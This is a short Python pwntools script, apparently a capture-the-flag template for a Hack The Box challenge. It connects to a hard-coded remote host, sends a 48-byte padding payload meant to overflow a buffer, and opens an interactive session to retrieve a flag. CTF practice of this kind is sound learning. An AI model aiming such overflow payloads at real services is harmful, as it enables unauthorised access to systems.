#!/usr/bin/python3.8

'''
You need to install pwntools to run the script.
To run the script: python3 ./wrapper.py
'''

# Library
from pwn import *

# Open connection 94.237.49.23:39749
IP   = '94.237.49.23' # Change this
PORT = 39749      # Change this

r    = remote(IP, PORT)
# e = ELF("./gs")
# p = process(e.path)

# Craft payload
payload = b'A' * 48 # Change the number of "A"s

# Send payload
r.sendline(payload)
r.interactive()

# Read flag
# success(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}')
